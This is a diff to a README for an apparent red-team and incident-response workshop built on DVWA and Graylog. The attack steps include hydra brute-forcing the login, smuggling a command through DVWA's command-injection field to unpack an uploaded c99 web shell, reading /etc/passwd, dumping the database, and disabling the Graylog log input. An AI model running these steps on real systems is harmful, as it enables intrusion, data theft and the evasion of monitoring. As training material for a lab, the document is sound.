@@ -21,7 +21,7 @@ AuditD and logging systems: https://docs.google.com/presentation/d/1HiLPQ6p8dZak
 0. Continue to red teaming section
 
 ### Graylog Webgui setup
-0. Browse to `http://dvwa.hackinglab.beer` 
+0. Browse to `https://logging.hackinglab.beer` 
 0. Login
     1. username: admin
     1. password: admin
@@ -35,7 +35,7 @@ AuditD and logging systems: https://docs.google.com/presentation/d/1HiLPQ6p8dZak
 ### Nikto scanner
 0. Spin up Kali Linux VM
 0. Open terminal
-0. `nikto -host http://dvwa.hackinglab.beer`
+0. `nikto -host dvwa.hackinglab.beer -port 8080`
 
 ### Hydra brute force
 0. `hydra -l admin -P /usr/share/dirb/wordlists/small.txt dvwa.hackinglab.beer -s 8080 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V`
@@ -50,16 +50,16 @@ AuditD and logging systems: https://docs.google.com/presentation/d/1HiLPQ6p8dZak
 0. Select "Choose file", "c99.php.gz" then "Upload"
 0. Select "Command injection" on the right
 0. Enter `8.8.8.8; /bin/gunzip -v ../../hackable/uploads/c99.php` into "Enter ip address"
-0. Browse to http://dvwa.hackinglab.beer:8080/hackable/uploads/c99.php
+0. Browse to `http://dvwa.hackinglab.beer:8080/hackable/uploads/c99.php`
 
 ### Host situation awareness
-0. Get current user: whoami
-0. Get ip info: ip a
-0. Get hostname: hostname
-0. Get list of users: cat /etc/passwd
-0. Get connection info: ss -l -n -t
-0. Get process list: ps aux
-0. Get known hosts: arp -a
+0. Get current user: `whoami`
+0. Get ip info: `ip a`
+0. Get hostname: `hostname`
+0. Get list of users: `cat /etc/passwd`
+0. Get connection info: `ss -l -n -t`
+0. Get process list: `ps aux`
+0. Get known hosts: `arp -a`
 
 ### Dump database
 0. `mysql -u root -e "show databases;"`
@@ -68,9 +68,17 @@ AuditD and logging systems: https://docs.google.com/presentation/d/1HiLPQ6p8dZak
 0. `mysqldump -u root --database dvwa > dump.sql`
 0. Use c99.php web shell to download dump
 
+## Disable Graylog input
+0. Browse to `https://logging.hackinglab.beer` 
+0. Login
+    1. username: admin
+    1. password: admin
+0. Select "System" at the top then "Inputs"
+0. Select "Stop input" for "Beats" input
+
 ## Incident reponse demo
 ### Connecting to Graylog
-Browse to `http://dvwa.hackinglab.beer` 
+Browse to `http://logging.hackinglab.beer` 
 0. Login
     1. username: admin
     1. password: admin
@@ -100,12 +108,9 @@ It is important to understand the machine you are investigating
 0. What webshell did the attacker use? 
 0. Where was that webshell uploaded to?
 0. What commands/actions did the attacker use?
-0. Give a brief description how the attacker stole the data?
-0. Lookup three mitigations for next week.
-
 
 ## IR challenge
-0. Browse to `http://dvwa.hackinglab.beer` 
+0. Browse to `http://logging.hackinglab.beer` 
 0. Login
     1. username: admin
     1. password: admin
